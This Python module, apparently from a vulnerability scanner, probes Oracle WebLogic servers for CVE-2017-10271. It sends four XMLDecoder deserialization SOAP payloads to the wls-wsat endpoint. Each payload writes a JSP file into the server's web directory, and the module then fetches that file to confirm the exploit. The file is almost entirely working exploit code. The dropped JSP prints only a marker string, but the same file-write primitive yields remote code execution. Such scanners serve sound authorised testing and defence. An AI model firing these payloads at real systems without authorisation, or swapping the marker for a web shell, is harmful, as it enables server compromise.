#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from time import sleep

cve_2017_10271_payloads = [
    {
        'path-1': 'wls-wsat/CoordinatorPortType',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.6.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[<% out.println("<h1>{RCEMD}</h1>"); %>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
        'path-2': 'wls-wsat/{FILENAME}.jsp',
    },
    {
        'path-1': 'wls-wsat/CoordinatorPortType',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.6.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/9j4dqk/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[<% out.println("<h1>{RCEMD}</h1>"); %>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
        'path-2': 'wls-wsat/{FILENAME}.jsp',
    },
        {
        'path-1': 'CoordinatorPortType',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.6.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[<% out.println("<h1>{RCEMD}</h1>"); %>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
        'path-2': '{FILENAME}.jsp',
    },
    {
        'path-1': 'CoordinatorPortType',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java version="1.6.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/9j4dqk/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[<% out.println("<h1>{RCEMD}</h1>"); %>]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>''',
        'path-2': '{FILENAME}.jsp',
    },
]

def cve_2017_10271_scan(clients):
    ''' Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
            < 10.3.6
            Weblogic的WLS Security组件对外提供webservice服务, 其中使用了XMLDecoder来解析用户传入的XML数据, 在解析的过程中出现反序列化漏洞, 导致可执行任意命令
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Weblogic',
        'vul_type': 'unSerialization',
        'vul_id': 'CVE-2017-10271',
    }

    headers = {
        'Content-Type': 'text/xml'
    }

    for payload in cve_2017_10271_payloads:
        randomFileName = random_md5()
        randomStr = random_md5()
        
        path_1 = payload['path-1']
        data_1 = payload['data-1'].format(FILENAME=randomFileName, RCEMD=randomStr)
        path_2 = payload['path-2'].format(FILENAME=randomFileName)

        res1 = client.request(
            'post',
            path_1,
            data=data_1,
            headers=headers,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        sleep(3)                    # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
        
        res2 = client.request(
            'get',
            path_2,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue
        
        if ((res2.status_code == 200) and (randomStr in res2.text)):
            results = {
                'Target': res1.request.url,
                'Verify': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request-1': res1,
                'Request-2': res2,
            }
            return results
    return None
